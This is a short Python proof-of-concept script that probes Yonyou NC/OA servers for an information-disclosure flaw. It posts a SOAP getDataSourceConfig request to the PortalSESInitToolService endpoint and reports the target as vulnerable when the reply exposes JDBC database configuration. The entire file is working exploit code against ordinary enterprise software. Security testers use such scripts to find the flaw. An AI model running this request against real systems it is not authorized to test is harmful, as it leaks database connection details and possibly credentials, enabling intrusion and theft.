import requests
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url = target + '/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService '
        data = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:por="http://inittool.ses.itf.nc/PortalSESInitToolService">
   <soapenv:Header/>
   <soapenv:Body>
      <por:getDataSourceConfig/>
   </soapenv:Body>
</soapenv:Envelope>
'''
        req = requests.post(url,headers=headers,data=data)
        if req.status_code == 200 and 'jdbc' in req.text:
            print("\033[0;31m 存在用友oa 数据库读取漏洞："+ url )
    except:
        pass


